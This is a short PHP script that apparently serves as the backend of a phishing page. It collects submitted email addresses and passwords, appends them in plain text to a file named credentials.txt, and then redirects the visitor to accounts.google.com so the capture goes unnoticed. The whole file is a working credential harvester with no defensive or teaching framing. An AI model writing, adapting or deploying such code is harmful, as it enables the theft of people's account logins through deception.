<?php
// Ensure no output before headers
ob_start();

// Get the submitted email and password
$email = isset($_POST['email']) ? $_POST['email'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';

// Sanitize the inputs
$email = filter_var($email, FILTER_SANITIZE_EMAIL);
$password = filter_var($password, FILTER_SANITIZE_STRING);

// File to store credentials
$file = 'credentials.txt';

// Append the credentials to the file if both are provided
if ($email && $password) {
    $entry = "Email: $email\nPassword: $password\n\n";
    file_put_contents($file, $entry, FILE_APPEND | LOCK_EX); // Append securely
}

// Perform redirection
header('Location: https://accounts.google.com');
exit;

// End output buffering
ob_end_flush();
?>

